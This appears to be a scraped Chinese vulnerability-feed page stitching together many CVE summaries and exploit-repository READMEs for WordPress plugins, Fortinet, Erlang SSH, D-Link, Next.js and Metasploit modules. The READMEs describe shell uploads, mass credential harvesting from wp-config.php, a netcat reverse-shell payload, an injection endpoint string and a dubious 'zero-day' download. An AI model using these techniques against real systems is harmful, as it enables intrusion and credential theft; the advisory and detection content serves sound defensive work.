漏洞描述： WordPress Celestial Aura主题（由dkszone开发）版本2.2及以下存在一个不受限制的文件上传漏洞。低权限认证用户可以通过主题的管理面板上传任意PHP文件，可能导致远程代码执行（RCE）。受影响的文件是wp-admin/admin.php?page=CA-settings，任何认证用户（订阅者及以上）均可利用此漏洞，且没有nonce、文件类型或扩展名验证。

产品厂商： dkszone

  • CVE-2025-26892.py
  • LICENSE
  • README.md

原始信息

CVE-2025-26892 – WordPress Celestial Aura Theme <= 2.2 Arbitrary File Upload (Authenticated)

📄 Description

An Unrestricted File Upload vulnerability exists in the WordPress Celestial Aura theme (developed by dkszone) up to version 2.2.
A low-privileged authenticated user can upload arbitrary PHP files through the theme’s admin panel, potentially leading to Remote Code Execution (RCE).

  • Affected theme: Celestial Aura
  • Affected versions: ≤ 2.2
  • Vulnerable file: wp-admin/admin.php?page=CA-settings
  • Exploitable by: Any authenticated user (subscriber and above)
  • No nonce, file type, or extension validation

🛡️ CVSS Score

Patchstack CNA Rating:

  • Base Score: 9.9 (CRITICAL)
  • Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

🚀 Usage

The script logs in with the provided credentials, uploads a malicious PHP shell (nxploit.php) via the vulnerable theme settings, and prints the direct URL to the uploaded shell.

✅ Successful Exploit Output

⚠️ Disclaimer

This project is for educational and authorized penetration testing purposes only.
Any misuse of this tool is not the responsibility of the author.

entry.title: WordPress Nasa Core Plugin 本地文件包含漏洞
entry.content:
漏洞信息

注: 本模块来自 AI 可能存在错误

漏洞名称： WordPress Nasa Core Plugin 本地文件包含漏洞

漏洞编号：

  • CVE： CVE-2025-39507

漏洞类型： 文件包含

漏洞等级： 高危

漏洞描述： WordPress的Nasa Core插件（版本6.3.2及以下）存在一个本地文件包含漏洞（CVE-2025-39507）。攻击者可以通过操纵文件输入参数来访问服务器上的敏感文件，例如通过构造特定的URL路径（如/index.php?file=../../../../etc/passwd）来尝试读取系统文件。该漏洞源于插件未能正确验证文件输入，导致攻击者可以指定任意路径进行文件包含操作。

产品厂商： WordPress

产品名称： Nasa Core Plugin

影响版本： <= 6.3.2

来源： https://github.com/blackgirlinfosec/cve-lfi-lab

类型： CVE-2025:github search

仓库文件

  • README.md

原始信息

🧠 CVE Lab: Tier 1 SOC Analyst Simulation

CVE-2025-39507 | Local File Inclusion in WordPress Nasa Core Plugin

📝 Scenario: A Day in the SOC

It’s a regular Monday. I’m logged into the SOC dashboard, reviewing alerts like usual. One comes in that catches my eye:

ALERT: Possible Local File Inclusion (LFI) Attempt
IP Address: 203.0.113.44
URL: /index.php?file=../../../../etc/passwd
User Agent: curl/7.81.0

It looks like someone might be trying to access system files by manipulating a URL. My job is to look into it and decide if this needs to be escalated.

🔎 Background on the CVE

After some quick research, I found this matches a known vulnerability: CVE-2025-39507. It affects a WordPress plugin called Nasa Core (version 6.3.2 and below). It allows attackers to view sensitive files on the server by changing a file input parameter.

Example:

If the plugin doesn’t validate the file input correctly, it’ll just follow whatever path the attacker gives it.

🛠️ My Tier 1 Investigation

1. Checked the Alert in Sentinel

I didn’t write the detection rule, but I reviewed it to understand what triggered the alert. It looks for things like:

  • URLs with “../” (path traversal)
  • Requests to sensitive files like /etc/passwd or /wp-config.php
  • Scripts or tools in the user agent (like curl or Python)

Here’s a simplified version of the rule:

2. Looked Up the IP Address

I ran a query to see if the IP 203.0.113.44 was trying anything else:

Turns out, it also hit other paths like /admin/, /login.php, and /wp-config.php. That told me this wasn’t just a one-time request — it was probably a scanner or someone doing recon.

3. Checked the Timeline

I checked how long the IP had been active in our logs:

It started a few hours ago and was still active recently. So it wasn’t historical noise — this was ongoing.

4. Escalated to Tier 2

Here’s how I documented it for escalation:

“Possible LFI scan from IP 203.0.113.44. The request pattern matches CVE-2025-39507. IP accessed 9 unique paths including /etc/passwd and wp-config.php using curl. Behavior suggests automated recon. Recommend Tier 2 review and possible IP block.”

📸 Screenshots

#DescriptionFile
1CVE Listing (Patchstack)1_cve_selection_listing.png
2Patchstack Overview2_patchstack_cve_overview.png
3VulDB Vector Example3_vuldb_exploit_vector.png
4Azure Kali VM Created4_kali_vm_deployed.png
5VM Running Screenshot5_kali_vm_running_status.png
6SSH Access to Kali6_kali_vm_logged_in.png
7Sentinel KQL Rule Review7_lfi_detection_kql_query.png

All screenshots are located in the /screenshots folder.

🔁 Reflection

Some questions I asked myself as I worked through this:

  • What signs in the logs made this alert stand out?
  • How can I tell if this is just a scanner or something more serious?
  • What else might happen if this LFI attack actually succeeded?
  • What’s the right balance between alert fatigue and escalation?

🔜 What’s Next – Phase 2

Next, I’ll run a safe simulation of this attack in a controlled lab environment using a platform like TryHackMe. The goal is to better understand what this type of activity looks like from the attacker’s side — and what kind of logs it creates.

⚠️ Disclaimer

This lab was done in a safe, ethical environment for training purposes only. No real systems were targeted or harmed. Always follow your organization’s rules and never test exploits on systems you don’t own or have permission to test.

漏洞描述： WordPress插件File Away版本<=3.9.9.0.1存在未认证的任意文件读取漏洞。攻击者可以通过向插件的AJAX端点发送特制请求来读取服务器上的任何文件，如wp-config.php。漏洞源于使用fileaway-stats动作通过admin-ajax.php时的不当nonce验证和路径限制缺失。攻击者可利用此漏洞检索敏感文件并提取凭证，可能导致完全妥协。

产品厂商： WordPress

产品名称： File Away

影响版本： <= 3.9.9.0.1

来源： https://github.com/Yucaerin/CVE-2025-2539

类型： CVE-2025:github search

仓库文件

  • mass_cve_2539.py
  • readme.md

原始信息

CVE-2025-2539 - WordPress File Away <= 3.9.9.0.1 - Arbitrary File Read

🔥 Vulnerability Summary
The WordPress plugin File Away version <= 3.9.9.0.1 is vulnerable to an unauthenticated arbitrary file read vulnerability.
This allows attackers to read any file on the server, such as wp-config.php, through a crafted request to the plugin’s AJAX endpoint.

The vulnerability stems from improper nonce validation and lack of path restriction when using the fileaway-stats action via admin-ajax.php.
Attackers can leverage this to retrieve sensitive files and extract credentials, potentially leading to full compromise.

🔍 Affected Plugin

  • Plugin Name: File Away
  • Affected Version: <= 3.9.9.0.1
  • Vulnerability Type: Unauthenticated Arbitrary File Read
  • CVE ID: CVE-2025-2539
  • CVSS Score: 9.1 (Critical)
  • Impact: Sensitive Information Disclosure → Potential RCE (via DB creds + upload)

🧪 Exploit Features

  • 📥 Fetches nonce automatically from the target page
  • 📄 Reads arbitrary file (e.g., wp-config.php)
  • 🔍 Extracts DB credentials (DB_USER, DB_PASSWORD, DB_HOST)
  • ✅ Validates access to /phpmyadmin or /phpMyAdmin
  • 🌐 Attempts remote DB login using retrieved credentials
  • 💾 Stores valid credentials and phpMyAdmin access in:
    • result_database.txt
    • result_phpmyadmin_dan_config_valid.txt
    • result_databaseremotevalid.txt

🧠 Researcher
Credit: https://github.com/RootHarpy/CVE-2025-2539

🚀 Usage
Prepare your list.txt file with a list of target domains (one per line, without http or https).

Example list.txt:

Run the script:

📁 Output

  • result_database.txt → List of extracted DB credentials
  • result_phpmyadmin_and_config_valid.txt → List of phpMyAdmin URLs found
  • result_databaseremotevalid.txt → List of valid remote DB credentials

🔒 Disclaimer:
This tool is intended for educational purposes only and should only be used on systems you own or are explicitly authorized to test. Misuse of this code may lead to legal consequences.

漏洞描述： Cisco ISE云部署在AWS、Microsoft Azure和Oracle Cloud Infrastructure (OCI)上存在一个严重的凭证生成和授权逻辑缺陷，导致使用相同软件版本的云部署共享相同的凭证。这使得未经认证的远程攻击者能够提取有效凭证并在不同部署间提升权限。

原始信息

Zero-Day Expl0it for Cisco ISE Cloud Credential Sharing Vulnerability (CVE-2025-20286)

All materials included in this repository are collected from publicly available sources.

Severity: Critical (CVSS 9.9)

Affected Platforms: Cisco Identity Services Engine (ISE) cloud deployments on AWS, Microsoft Azure, and Oracle Cloud Infrastructure (OCI)

  • Vulnerability Description:
    A critical flaw in the credential generation and authorization logic causes multiple Cisco ISE cloud deployments to share identical credentials when using the same software release on the same cloud platform. This allows an unauthenticated remote attacker to extract valid credentials and escalate privileges across different deployments.

  • Expl0it Capabilities:

    • Remote credential disclosure
    • Limited administrative operations
    • System configuration modification
    • Service disruption

Exploitation Method: Network-based, no prior authentication needed

Stability: Fully developed and tested expl0it with detailed deployment instructions

Disclaimer: Intended for authorized research and penetration testing only; misuse prohibited

This repository will be deleted.

Download

entry.title: Fortinet 缓冲区溢出漏洞
entry.content:
漏洞信息

注: 本模块来自 AI 可能存在错误

漏洞名称： Fortinet 缓冲区溢出漏洞

漏洞编号：

  • CVE： CVE-2025-32756

漏洞类型： 缓冲区溢出

漏洞等级： 严重

漏洞描述： Fortinet产品中存在一个严重的基于栈的缓冲区溢出漏洞（CVE-2025-32756），影响FortiVoice、FortiMail、FortiNDR、FortiRecorder和FortiCamera。该漏洞存在于处理/remote/hostcheck_validate端点中的enc参数时，由于边界检查不当导致缓冲区溢出，允许未经身份验证的远程代码执行。

产品名称： FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera

影响版本： FortiVoice: 1.0.0 < version < 7.2.1, 7.0.7, 6.4.11; FortiMail: 1.0.0 < version < 7.6.3, 7.4.5, 7.2.8, 7.0.9; FortiNDR: 1.0.0 < version < 7.6.1, 7.4.8, 7.2.5, 7.0.7; FortiRecorder: 1.0.0 < version < 7.2.4, 7.0.6, 6.4.6; FortiCamera: 1.0.0 < version < 2.1.4

类型： CVE-2025:github search

仓库文件

  • README.md
  • fortinet_cve_2025_32756_poc.py
  • requirements.txt

原始信息

CVE-2025-32756: Fortinet RCE PoC

A proof-of-concept for the critical stack-based buffer overflow vulnerability (CVE-2025-32756) affecting Fortinet products.

Vulnerability

  • CVSS: 9.8 (Critical)
  • Type: Stack-based buffer overflow in AuthHash cookie processing
  • Impact: Unauthenticated remote code execution
  • Affected Products: FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera

The vulnerability exists in the processing of the enc parameter in the /remote/hostcheck_validate endpoint, where improper bounds checking allows buffer overflow.

Usage

Arguments:

  • target_ip: Target Fortinet device
  • -p, --port: Target port (default: 443)
  • -d, --debug: Enable debug output

Mitigation

Update to patched versions:

  • FortiVoice: 7.2.1+, 7.0.7+, 6.4.11+
  • FortiMail: 7.6.3+, 7.4.5+, 7.2.8+, 7.0.9+
  • FortiNDR: 7.6.1+, 7.4.8+, 7.2.5+, 7.0.7+
  • FortiRecorder: 7.2.4+, 7.0.6+, 6.4.6+
  • FortiCamera: 2.1.4+

Disclaimer

For educational and research purposes only. Use only against systems you own or have permission to test.

漏洞类型： 命令执行

漏洞等级： 严重

漏洞描述： Erlang/OTP是一套为Erlang编程语言设计的库。在版本OTP-27.3.3、OTP-26.2.5.11和OTP-25.3.2.20之前，SSH服务器可能允许攻击者执行未经认证的远程代码执行（RCE）。通过利用SSH协议消息处理中的缺陷，恶意行为者可以在没有有效凭证的情况下获得对受影响系统的未授权访问并执行任意命令。此问题已在版本OTP-27.3.3、OTP-26.2.5.11和OTP-25.3.2.20中修复。临时解决方案包括禁用SSH服务器或通过防火墙规则阻止访问。

影响版本： version < OTP-27.3.3, version < OTP-26.2.5.11, version < OTP-25.3.2.20

原始信息

Blackash-CVE-2025-32433

CVE-2025-32433 Erlang SSH Library Exploit 🛑

Description:

Erlang/OTP is a set of libraries for the Erlang programming language. Prior to versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20, a SSH server may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials. This issue is patched in versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20. A temporary workaround involves disabling the SSH server or to prevent access via firewall rules.

Metrics:

CNA: GitHub, Inc. Base Score: 10.0 CRITICAL ⚫ Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

Features:

  • Original exploit by Matthew Keeley
  • Updated version by Tyler Ramsbey:
    1. Command‑line arguments for LHOST, LPORT, RHOST, and RPORT
    2. Built‑in help and usage via argparse
    3. Erlang‑style reverse shell payload using os:cmd("nc LHOST LPORT -e /bin/sh").
    4. Clean function decomposition and status logging for each stage

Prerequisites:

  • Python3
  • A working nc (Netcat) listener on your attack machine
  • Network access to the target SSH service (default port 22)

Usage:

  1. Start your listener on the attack box:
  1. Run the exploit:
  1. Wait for the shell to connect back to your listener.

entry.title: Linux Kernel ksmbd Use-After-Free Vulnerability
entry.content:
漏洞信息

注: 本模块来自 AI 可能存在错误

漏洞名称： Linux Kernel ksmbd Use-After-Free Vulnerability

漏洞编号：

  • CVE： CVE-2025-37899

漏洞类型： 权限提升

漏洞等级： 高危

漏洞描述： Linux内核的ksmbd模块中发现了一个use-after-free类型的漏洞，该漏洞可能允许攻击者以提升的权限远程执行代码。漏洞存在于处理SMB2/3的logoff命令时，当线程释放与对象sess->user关联的内存时，如果另一个线程尝试访问这个已释放的对象，可能会导致内存损坏，进而可能执行任意代码。

产品厂商： Linux

产品名称： ksmbd

来源： https://github.com/vett3x/SMB-LINUX-CVE-2025-37899

类型： CVE-2025:github search

仓库文件

  • README.md

原始信息

Vulnerabilidad Use-After-Free en ksmbd del Kernel de Linux (CVE-2025-37899)

Descripción

Se ha descubierto una vulnerabilidad de tipo use-after-free en el módulo ksmbd del kernel de Linux, responsable de la implementación del protocolo SMB (Server Message Block) para el intercambio de archivos en red. Esta vulnerabilidad, identificada como CVE-2025-37899, podría permitir la ejecución remota de código con privilegios elevados.

Introducción

El hallazgo fue realizado por el investigador Sean Heelan utilizando el modelo o3 de OpenAI, lo que demuestra el potencial de la inteligencia artificial en la identificación de vulnerabilidades complejas. La vulnerabilidad reside en el manejo del comando logoff de SMB2/3 y puede ser explotada bajo ciertas condiciones de concurrencia.

Detalles Técnicos

Descripción de la Vulnerabilidad

La vulnerabilidad use-after-free ocurre cuando un hilo (thread) libera la memoria asociada al objeto sess->user durante el procesamiento del comando logoff. Si otro hilo intenta acceder a este objeto liberado, se produce una condición de carrera que puede resultar en corrupción de memoria y, potencialmente, en la ejecución de código arbitrario.

El código vulnerable se encuentra en la función smb2_session_logoff dentro del módulo ksmbd. La falta de sincronización adecuada en el acceso al objeto sess->user permite que la memoria sea liberada mientras aún está siendo utilizada por otro hilo.

Código Afectado (Ejemplo)

Vectores de Ataque

Un atacante remoto podría explotar esta vulnerabilidad enviando una serie de comandos SMB2/3 diseñados para crear una condición de carrera en el acceso al objeto sess->user. Esto podría lograrse estableciendo múltiples conexiones SMB y manipulando el cierre de sesión para que coincida con el acceso concurrente al objeto.

Impacto

La explotación exitosa de esta vulnerabilidad podría permitir a un atacante:

Ejecutar código arbitrario en el sistema afectado con privilegios de kernel.
Obtener acceso no autorizado a información sensible.
Comprometer la integridad y disponibilidad del sistema.

Solución

Parches
Se recomienda aplicar los parches de seguridad proporcionados por su distribución de Linux a la brevedad. Las principales distribuciones ya están trabajando en la publicación de actualizaciones.

Y en las funciones que acceden a sess->user, también se debe proteger:

Medidas de Mitigación

En caso de no poder aplicar los parches de inmediato, se recomienda:

Deshabilitar el módulo ksmbd si no es necesario.
Restringir el acceso al puerto SMB (445) mediante firewalls.
Implementar medidas de seguridad adicionales, como la monitorización de tráfico SMB y la detección de anomalías.
Referencias
CVE-2025-37899: Enlace al CVE (cuando esté disponible)
Anuncio del Descubrimiento: Enlace al artículo o publicación original
Repositorio del Kernel de Linux: Enlace al código fuente afectado

Agradecimientos

Agradecimiento a Sean Heelan por el descubrimiento y a la comunidad de ciberseguridad por su colaboración en la mitigación de esta vulnerabilidad.

CVE-2024-10914 - D-Link Remote Code Execution (RCE) Exploit

This script is a proof-of-concept (PoC) exploit for CVE-2024-10914, a remote code execution vulnerability in certain D-Link devices. The script identifies and exploits vulnerable devices to execute arbitrary commands.

Note: This script should only be used for educational purposes or in authorized environments. Unauthorized exploitation of this vulnerability may be illegal and unethical.

Features

  • Vulnerability Check: The script can check if a target is vulnerable to CVE-2024-10914.
  • Exploit: Exploit the vulnerability by sending payloads to gain remote command execution.
  • Interactive Shell: After exploitation, an interactive shell is started for executing further commands.
  • Multi-target Scanning: Scan multiple targets from a file using multiple threads for faster vulnerability detection.

Requirements

  • Python 3.x
  • requests (for HTTP requests)
  • alive-progress (for progress bars)
  • prompt_toolkit (for the interactive shell)
  • argparse (for handling command-line arguments)

To install required libraries, use:

Command-Line Arguments

Example Usage

  • Check a Single Target:

Scan Multiple Targets from a File

Exploit Details

This script attempts to exploit a vulnerability in D-Link devices, specifically targeting the following

  • Vulnerable Endpoint: /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=’;{};’
  • Payloads: Various system commands (id, uname -a, hostname, cat /proc/cpuinfo, etc.)
    The exploit is carried out by injecting system commands into the vulnerable endpoint, triggering the remote execution of arbitrary commands on the target device

Disclaimer

This script is for educational purposes only. Do not use this script on systems or networks you do not have explicit permission to test.

The authors are not responsible for any misuse of this tool.

For more details, please refer to the official GitHub repository:
https://github.com/ThemeHackers/CVE-2024-10914

Contributing

If you find any issues or want to contribute, feel free to open an issue or submit a pull request on the GitHub repository.

License

This project is licensed under the MIT License - see the LICENSE file for details

漏洞描述： Microsoft Windows File Explorer存在一个欺骗漏洞，编号为CVE-2025-24071。该漏洞源于Windows Explorer对.library-ms文件的隐式信任和自动解析行为。未经认证的攻击者可以通过构造包含恶意SMB路径的RAR/ZIP文件来利用此漏洞。解压缩时，会触发SMB认证请求，可能泄露用户的NTLM哈希。目前已有公开的PoC（概念验证）利用代码，使得该漏洞成为当前威胁。受影响的用户应立即应用补丁以降低风险。

产品厂商： Microsoft

产品名称： Windows File Explorer

影响版本： Windows 10 Version 1809 for x64-based Systems, Windows 10 Version 1809 for 32-bit Systems, Windows Server 2025 (Server Core installation), Windows Server 2025, Windows Server 2012 R2 (Server Core installation), Windows Server 2012 R2, Windows Server 2016 (Server Core installation), Windows Server 2016, Windows 10 Version 1607 for x64-based Systems, Windows 10 Version 1607 for 32-bit Systems, Windows 10 for x64-based Systems, Windows 10 for 32-bit Systems, Windows 11 Version 24H2 for x64-based Systems, Windows 11 Version 24H2 for ARM64-based Systems, Windows Server 2022, 23H2 Edition (Server Core installation), Windows 11 Version 23H2 for x64-based Systems, Windows 11 Version 23H2 for ARM64-based Systems, Windows 10 Version 22H2 for 32-bit Systems, Windows 10 Version 22H2 for ARM64-based Systems, Windows 10 Version 22H2 for x64-based Systems, Windows 11 Version 22H2 for x64-based Systems, Windows 11 Version 22H2 for ARM64-based Systems, Windows 10 Version 21H2 for x64-based Systems, Windows 10 Version 21H2 for ARM64-based Systems, Windows 10 Version 21H2 for 32-bit Systems, Windows Server 2022 (Server Core installation), Windows Server 2022, Windows Server 2019 (Server Core installation), Windows Server 2019

来源： https://github.com/TH-SecForge/CVE-2025-24071

类型： CVE-2025:github search

仓库文件

  • LICENSE
  • README.md
  • exploit.py
  • requirements.txt

POC详情

Security Vulnerability Report: CVE-2025-24071 - Windows File Explorer Spoofing Vulnerability

Overview

NSFOCUS CERT has detected that Microsoft recently released a security update to address a critical spoofing vulnerability in Windows File Explorer, identified as CVE-2025-24071. This vulnerability has a CVSS score of 7.5, indicating its severity. The issue arises from the implicit trust and automatic file parsing behavior of .library-ms files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user’s NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat. Affected users are strongly advised to apply the patch immediately to mitigate the risk.

Reference: Microsoft Security Update

Scope of Impact

Affected Versions:

  • Windows 10 Version 1809 for x64-based Systems
  • Windows 10 Version 1809 for 32-bit Systems
  • Windows Server 2025 (Server Core installation)
  • Windows Server 2025
  • Windows Server 2012 R2 (Server Core installation)
  • Windows Server 2012 R2
  • Windows Server 2016 (Server Core installation)
  • Windows Server 2016
  • Windows 10 Version 1607 for x64-based Systems
  • Windows 10 Version 1607 for 32-bit Systems
  • Windows 10 for x64-based Systems
  • Windows 10 for 32-bit Systems
  • Windows 11 Version 24H2 for x64-based Systems
  • Windows 11 Version 24H2 for ARM64-based Systems
  • Windows Server 2022, 23H2 Edition (Server Core installation)
  • Windows 11 Version 23H2 for x64-based Systems
  • Windows 11 Version 23H2 for ARM64-based Systems
  • Windows 10 Version 22H2 for 32-bit Systems
  • Windows 10 Version 22H2 for ARM64-based Systems
  • Windows 10 Version 22H2 for x64-based Systems
  • Windows 11 Version 22H2 for x64-based Systems
  • Windows 11 Version 22H2 for ARM64-based Systems
  • Windows 10 Version 21H2 for x64-based Systems
  • Windows 10 Version 21H2 for ARM64-based Systems
  • Windows 10 Version 21H2 for 32-bit Systems
  • Windows Server 2022 (Server Core installation)
  • Windows Server 2022
  • Windows Server 2019 (Server Core installation)
  • Windows Server 2019

Detection

To determine whether your system is at risk, follow these steps:

  1. Check System Version:

    • Press Win+R, type winver, and press Enter. This will display the version and build number of your Windows operating system.

  2. Verify Patch Installation:

    • Open Command Prompt and run systeminfo to check the details of installed patches.

Mitigation

Microsoft has released a security patch to address this vulnerability for all supported versions. It is crucial to apply the patch as soon as possible to protect against potential exploitation.

Patch Installation:

  • Download the patch: Microsoft Security Update
  • Windows Update: Go to Settings → Update & Security → Windows Update. Check for updates and ensure the patch has been installed.
  • View Update History: If the patch installation fails, you can view the update history or manually download the update from the Microsoft Update Catalog.

If the patch fails to install through Windows Update, you can manually download and install the standalone package by visiting the Microsoft Update Catalog.

For further information and updates, refer to the official Microsoft Security Response Center.

漏洞编号：

  • CVE： CVE-2025-29927

漏洞类型： 权限绕过

漏洞等级： 严重

漏洞描述： CVE-2025-29927是影响Next.js的一个严重安全漏洞，Next.js是一个用于构建全栈Web应用的流行React框架。此漏洞允许攻击者绕过Next.js中间件中实现的授权检查，可能未经授权访问应用的敏感区域，如管理页面或用户仪表板。漏洞源于对内部x-middleware-subrequest头的不当处理。通过构造包含此头的请求，攻击者可以绕过中间件安全检查，跳过认证和授权机制。

产品厂商： Next.js

产品名称： Next.js

影响版本： version < 14.2.25, version < 15.2.3

来源： https://github.com/TH-SecForge/CVE-2025-29972

类型： CVE-2025:github search

仓库文件

  • LICENSE
  • README.md
  • exploit.py
  • requirements.txt

POC详情

CVE-2025-29927 - Critical Security Vulnerability in Next.js

Overview

CVE-2025-29927 is a critical security vulnerability affecting Next.js, a popular React framework for building full-stack web applications. This flaw allows attackers to bypass authorization checks implemented in Next.js middleware, potentially granting unauthorized access to sensitive areas of an application, such as admin pages or user dashboards.

Vulnerability Details

The vulnerability arises from the improper handling of the internal x-middleware-subrequest header. By crafting requests that include this header, an attacker can bypass middleware security checks, effectively skipping authentication and authorization mechanisms.

Affected Versions

  • Next.js versions prior to 14.2.25 and 15.2.3 are vulnerable.

How to use

Quick to use

⚠️ Note: Ensure that your Next.js applications are always updated to the latest stable versions to prevent security risks.

entry.content:

漏洞类型： 权限绕过

漏洞等级： 中危

漏洞描述： 在Android 15（SDK 35）上，使用Pixel 6手机创建并运行一个恶意的.apk文件时，由于Android 14引入的动态代码加载限制，导致Meterpreter会话在阶段发送后失败。这表明存在一个权限绕过问题，可能通过File.setReadOnly()进行向后兼容的修复。

产品厂商： Google

产品名称： Android

影响版本： 15 (SDK 35)

来源： https://github.com/rapid7/metasploit-framework/issues/20294

类型： rapid7/metasploit-framework:github issues

Steps to reproduce

Using a Pixel 6 phone running Android 15 (SDK 35).
Created a payload .apk with

I expect this is due to restrictions around dynamic code loading added in Android 14 (https://developer.android.com/about/versions/14/behavior-changes-14?utm_source=chatgpt.com#safer-dynamic-code-loading). I think there is an easy backwards-compatible fix with File.setReadOnly() so I will try to send a PR.

Expected behavior

Stage sends / is run successfully and full Meterpreter session is opened.

Current behavior

Phone logs showing code loading error:

Sessions are opening but fail when stage times out:

Metasploit version

Framework: 6.4.55-dev-

🚨 CVE-2025-48129 - Privilege Escalation in WordPress Spreadsheet Price Changer Plugin

🛡️ Vulnerability Summary

  • Plugin Affected: Spreadsheet Price Changer for WooCommerce and WP E-commerce – Light
  • Vulnerable Versions: <= 2.4.37
  • Patched Version: ❌ No official fix available
  • Discovered By: Patchstack | 20 May 2025
  • CVE ID: CVE-2025-48129
  • CVSS Score: 9.8 (Critical)
  • Patch Priority: 🔴 High

🔥 Risk

Unauthenticated attackers can escalate privileges by creating an Administrator-level account without needing any prior access. This allows complete takeover of the WordPress site.

Classified under: OWASP A7 – Identification and Authentication Failures

🧪 Exploit Script Overview

This Python script targets vulnerable versions of the plugin and registers a new WordPress Administrator using only an email and password (hashed via MD5).

▶️ Example Usage

📘 Usage Help

✅ Successful Output Example

⚠️ Important Note

In some cases, logging in directly with the chosen password may fail.
This is not a bug in the exploit, but a result of how the vulnerable plugin passes hashed passwords to WordPress’s internal user creation system.

If you’re unable to log in, simply reset the password via email using the following URL:

WordPress will send a password reset email to the Admin account you just created — granting you full access.

🧾 Legal Disclaimer

This tool is provided for educational and authorized penetration testing purposes only.
The author assumes no responsibility for misuse or damage caused by this script.

By: Nxploited ( Khaled_alenazi )

entry.title: Fortinet 缓冲区溢出漏洞
entry.content:
漏洞名称： Fortinet 缓冲区溢出漏洞

漏洞编号：

  • CVE： CVE-2025-32756

漏洞类型： 缓冲区溢出

漏洞等级： 严重

漏洞描述： Fortinet多个产品中存在一个基于栈的缓冲区溢出漏洞（CWE-121），允许远程未经认证的攻击者通过发送带有特制hash cookie的HTTP请求执行任意代码或命令。受影响的端点包括/remote/hostcheck_validate中的enc参数处理，由于边界检查不当导致缓冲区溢出。

产品厂商： Fortinet

产品名称： FortiVoice, FortiRecorder, FortiMail, FortiNDR, FortiCamera

影响版本： FortiVoice: 7.2.0, 7.0.0 through 7.0.6, 6.4.0 through 6.4.10; FortiRecorder: 7.2.0 through 7.2.3, 7.0.0 through 7.0.5, 6.4.0 through 6.4.5; FortiMail: 7.6.0 through 7.6.2, 7.4.0 through 7.4.4, 7.2.0 through 7.2.7, 7.0.0 through 7.0.8; FortiNDR: 7.6.0, 7.4.0 through 7.4.7, 7.2.0 through 7.2.4, 7.0.0 through 7.0.6; FortiCamera: 2.1.0 through 2.1.3, 2.0 all versions, 1.1 all versions

来源： https://github.com/B1ack4sh/Blackash-CVE-2025-32756

类型： CVE-2025:github search

entry.title: Abandoned Cart Lite for WooCommerce 认证绕过漏洞
entry.content:
漏洞名称： Abandoned Cart Lite for WooCommerce 认证绕过漏洞

漏洞编号：

  • CVE： CVE-2023-2986

漏洞类型： 权限绕过

漏洞等级： 严重

漏洞描述： Abandoned Cart Lite for WooCommerce插件在版本5.14.2及之前存在认证绕过漏洞。这是由于插件在废弃购物车链接解码过程中对用户提供的加密不足，允许未认证的攻击者以废弃购物车的用户（通常是客户）身份登录。版本5.15.1引入了进一步的安全加固，确保站点不再通过历史结账链接受到攻击，版本5.15.2增加了额外的加固，确保空密钥值不会允许认证绕过。

产品厂商： tychesoftwares

产品名称： Abandoned Cart Lite for WooCommerce

影响版本： version <= 5.14.2

搜索语法： body=”/wp-content/plugins/woocommerce-abandoned-cart/“

来源： https://github.com/projectdiscovery/nuclei-templates/blob/8c3b2aa357db8d955f41f3bbff541063b2b81964/http%2Fcves%2F2023%2FCVE-2023-2986.yaml

漏洞类型： 权限绕过

漏洞等级： 严重

漏洞描述： Next.js是一个用于构建全栈Web应用的React框架。在版本1.11.4至12.3.5、13.5.9、14.2.25和15.2.3之前，如果授权检查发生在中间件中，则可能绕过Next.js应用中的授权检查。如果无法修补到安全版本，建议阻止包含x-middleware-subrequest头的外部用户请求到达您的Next.js应用。此漏洞已在12.3.5、13.5.9、14.2.25和15.2.3版本中修复。漏洞源于对内部x-middleware-subrequest头的不当处理。通过制作包含此头的请求，攻击者可以绕过中间件安全检查，有效地跳过认证和授权机制。

产品厂商： GitHub, Inc.

产品名称： Next.js

影响版本： 1.11.4 < version < 12.3.5, 12.3.5 < version < 13.5.9, 13.5.9 < version < 14.2.25, 14.2.25 < version < 15.2.3

来源： https://github.com/B1ack4sh/Blackash-CVE-2025-29927

类型： CVE-2025:github search

entry.content:

漏洞描述： 该模块通过在/etc/periodic目录中写入脚本实现持久化。根据The Art of Mac Malware，截至2024年，尚未有恶意软件以此方式实现持久化。此载荷需要root权限运行。

产品厂商： Apple

产品名称： Mac OS X

来源： https://github.com/rapid7/metasploit-framework/blob/a5e30153e827206ce468dd434590aa8ae063d891/modules%2Fexploits%2Fosx%2Flocal%2Fperiodic_script_persistence.rb

entry.title: Apport Symlink Hijacking Privilege Escalation
entry.content:
漏洞名称： Apport Symlink Hijacking Privilege Escalation

漏洞编号：

  • CVE： CVE-2020-8831

漏洞类型： 权限提升

漏洞等级： 高危

漏洞描述： 在Ubuntu Xenial Xerus 16.04.7等版本中，Apport 2.20崩溃处理器存在符号链接劫持漏洞。崩溃后，Apport会将报告写入/var/lock/apport/lock，攻击者可以通过/var/lock/apport创建指向特权目录的符号链接，从而创建具有全局0777权限的文件。此模块利用此弱点，通过创建指向/etc/cron.d/的符号链接来写入系统crontab，该crontab将以提升的权限执行有效载荷。

产品厂商： Ubuntu

产品名称： Apport

影响版本： 2.20.11

来源： https://github.com/rapid7/metasploit-framework/blob/31bfb0407bee930c355ee6e86ea4fa601054f8e7/modules%2Fexploits%2Flinux%2Flocal%2Fcve_2020_8831_apport_symlink_privesc.rb

类型： rapid7/metasploit-framework:github issues

entry.title: Apport Race Condition Vulnerability
entry.content:
漏洞名称： Apport Race Condition Vulnerability

漏洞编号：

  • CVE： CVE-2025-5054

漏洞类型： 信息泄露

漏洞等级： 高危

